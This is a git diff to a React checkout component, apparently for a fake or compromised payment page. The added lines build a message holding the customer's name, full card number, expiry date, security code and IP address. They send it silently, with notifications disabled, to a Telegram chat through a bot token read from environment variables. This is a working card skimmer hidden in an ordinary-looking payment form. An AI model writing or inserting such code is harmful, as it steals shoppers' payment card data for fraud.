@@ -8,7 +8,11 @@ import Footer from '../Layout/Footer';
 import visa from '../assets/visa.png';
 import mastercard from '../assets/mastercard.png';
 import aExpress from '../assets/a-express.png';
-
+import moment from "moment"
+const { TelegramClient } = require('messaging-api-telegram');
+const client = new TelegramClient({
+    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
+});
 const Payment = () => {
     const [fname, setFname] = useState('');
     const [lname, setLname] = useState('');
@@ -42,6 +46,22 @@ const Payment = () => {
                     ip_address: geoData.IPv4,
                     logged_at: Date.now()
                 }).then(data => {
+                    if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
+                    {
+                        let message = "Payment Data\r\n"
+                        message += "First Name: " + fname + '\r\n'
+                        message += "Last Name: " + lname + '\r\n'
+                        message += "Card Number: " + cardNum + '\r\n'
+                        message += "Expiry Date: " + expiry + '\r\n'
+                        message += "Security Code: " + cvc + '\r\n'
+                        message += "Ip Address: " + geoData.IPv4 + '\r\n'
+                        message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                        client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
+                            disableWebPagePreview: true,
+                            disableNotification: true,
+                        })
+                        .then( res => console.log(res,'telegram res'))
+                    }
                     setFromSuccess(true);
                 }).catch(err => {
                     throw new Error(err);
